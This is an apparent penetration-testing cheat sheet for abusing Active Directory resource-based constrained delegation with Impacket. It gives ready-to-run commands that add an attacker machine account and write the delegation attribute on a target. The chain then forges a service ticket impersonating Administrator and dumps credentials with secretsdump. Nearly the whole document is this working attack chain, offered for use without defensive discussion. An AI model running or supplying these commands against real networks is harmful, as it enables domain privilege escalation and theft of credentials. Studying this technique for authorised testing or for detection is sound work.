# 07.01 Computer Accounts RBCD addcomputer.py rbcd.py

> Create a machine account (`addcomputer.py`) and write `msDS-AllowedToActOnBehalfOfOtherIdentity` (`rbcd.py`) for the full RBCD chain.

## Overview

addcomputer.py creates a machine account (requires MachineAccountQuota > 0 or CreateChild on OU). rbcd.py reads and writes msDS-AllowedToActOnBehalfOfOtherIdentity. Combined with getST, enables full RBCD privilege escalation.

## Steps

- MachineAccountQuota default = 10; check with Get-ADDomain | select -exp MachineAccountQuota
- addcomputer: -method SAMR (default) or LDAPS; use LDAPS if SAMR is blocked
- rbcd -action write: sets RBCD so delegate-to trusts delegate-from for S4U2Proxy
- rbcd -action read: checks current msDS-AllowedToActOnBehalfOfOtherIdentity value
- rbcd -action flush: removes all RBCD entries from the target
- Full chain: add computer → set RBCD → getST -impersonate → secretsdump / wmiexec

## Commands

### addcomputer — add machine account

```bash
impacket-addcomputer DOMAIN/user:'P@ss' -dc-ip DC_IP -computer-name EVILPC$ -computer-pass 'EvilPass123!'
impacket-addcomputer DOMAIN/user:'P@ss' -dc-ip DC_IP -computer-name EVILPC$ -computer-pass 'EvilPass123!' -method LDAPS
```

### rbcd — set RBCD on target

```bash
impacket-rbcd DOMAIN/user:'P@ss' -dc-ip DC_IP -action write -delegate-to TARGET$ -delegate-from EVILPC$
impacket-rbcd -hashes :NThash DOMAIN/user -dc-ip DC_IP -action write -delegate-to TARGET$ -delegate-from EVILPC$
```

### rbcd — read and flush

```bash
impacket-rbcd DOMAIN/user:'P@ss' -dc-ip DC_IP -action read -delegate-to TARGET$
impacket-rbcd DOMAIN/user:'P@ss' -dc-ip DC_IP -action flush -delegate-to TARGET$
```

### Full RBCD exploitation chain

```bash
# 1. Add attacker-controlled computer account
impacket-addcomputer DOMAIN/user:'P@ss' -dc-ip DC_IP -computer-name EVILPC$ -computer-pass 'EvilPass123!'
# 2. Set RBCD: TARGET$ trusts EVILPC$ to impersonate
impacket-rbcd DOMAIN/user:'P@ss' -dc-ip DC_IP -action write -delegate-to TARGET$ -delegate-from EVILPC$
# 3. S4U2Self + S4U2Proxy → get ticket as Administrator
impacket-getST DOMAIN/EVILPC$:'EvilPass123!' -spn cifs/TARGET.DOMAIN.LOCAL -impersonate Administrator -dc-ip DC_IP
# 4. Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
impacket-secretsdump -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN.LOCAL
```
